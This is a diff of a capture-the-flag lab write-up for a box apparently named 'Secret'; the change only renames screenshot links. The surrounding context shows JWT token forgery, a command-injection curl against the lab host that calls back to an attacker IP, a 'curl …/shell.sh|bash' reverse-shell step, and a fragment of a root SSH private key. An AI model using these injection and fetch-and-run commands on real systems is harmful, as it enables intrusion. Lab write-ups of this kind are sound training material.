@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 
 Port 80 was some kind of documentation website.
 
-![](<../../../.gitbook/assets/image%20(1297).png>)
+![](../../../.gitbook/assets/secret-1.png)
 
 This box uses JWT Tokens and an API to create new users and login. The API is hosted on port 3000. We can actually download all the source code and view the files within:
 
@@ -112,7 +112,7 @@ Then, we can spoof the token using this website:
 
 {% embed url="https://jwt.io/" %}
 
-![](<../../../.gitbook/assets/image%20(4055).png>)
+![](../../../.gitbook/assets/secret-6.png)
 
 We can verify that this works by using the `/api/priv` endpoint:
 
@@ -127,11 +127,11 @@ We can confirm RCE using this:
 $ curl 'http://10.129.71.62/api/logs?file=t;curl+10.10.14.13/rcecfm' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2NDU3NDUyNDA1MjNjMDA0N2VhOWM4NTIiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAd2Vic2l0ZS5jb20iLCJpYXQiOjE2ODM0NDA5ODZ9.88MSrMOiPfw7x7CzUNKPvNlUmVPMQ2S-ZtaQY-9PRuE'
 ```
 
-![](<../../../.gitbook/assets/image%20(4031).png>)
+![](../../../.gitbook/assets/secret-5.png)
 
 Then we can just use `curl 10.10.14.13/shell.sh|bash` to get a reverse shell.
 
-![](<../../../.gitbook/assets/image%20(2829).png>)
+![](../../../.gitbook/assets/secret-3.png)
 
 Grab that user flag.
 
@@ -458,7 +458,7 @@ Date          ExecutableTimestamp  ProcCwd      ProcStatus   UserGroups
 
 When we use `strings` on the `CoreDump` file, we can find the root flag:
 
-![](<../../../.gitbook/assets/image%20(2033).png>)
+![](../../../.gitbook/assets/secret-2.png)
 
 It seems that because we are running the `count` binary as `root` and we crash the program while reading the file, the file contents is still in memory. When the `CoreDump` file is created, the contents of memory is still present.
 
@@ -492,6 +492,6 @@ b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 
 With this private key, we can `ssh` in as `root`.
 
-![](<../../../.gitbook/assets/image%20(2940).png>)
+![](../../../.gitbook/assets/secret-4.png)
 
 Rooted!
